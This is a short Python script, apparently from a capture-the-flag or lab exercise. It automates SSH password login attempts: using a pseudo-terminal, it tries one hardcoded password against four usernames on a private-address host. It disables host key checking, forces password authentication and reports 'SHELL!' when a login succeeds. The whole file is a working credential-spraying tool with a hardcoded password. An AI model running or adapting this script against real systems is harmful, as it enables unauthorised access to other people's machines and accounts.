#!/usr/bin/env python3
import pty, os, sys, time

def try_ssh(user, password, host="10.129.107.139"):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("ssh", ["ssh","-o","StrictHostKeyChecking=no",
                          "-o","PreferredAuthentications=password",
                          "-o","PubkeyAuthentication=no","-o","NumberOfPasswordPrompts=1",
                          f"{user}@{host}","id"])
    out, sent = b"", False
    end = time.time() + 20
    while time.time() < end:
        try: d = os.read(fd, 4096)
        except OSError: break
        if not d: break
        out += d
        if not sent and b"password:" in out.lower():
            os.write(fd, password.encode()+b"\n"); sent = True
        if b"uid=" in out:
            os.close(fd); return True, out.decode(errors="replace")
        if b"permission denied" in out.lower():
            os.close(fd); return False, ""
    try: os.close(fd)
    except: pass
    return False, ""

PASS = 'N27xh!!2ucY04'
for user in ["j.matthew","krayin","admin","matthew"]:
    ok, out = try_ssh(user, PASS)
    print(f"[{'+'if ok else '-'}] {user}:{PASS} -> {'SHELL! '+out.strip().splitlines()[-1] if ok else 'denegado'}")
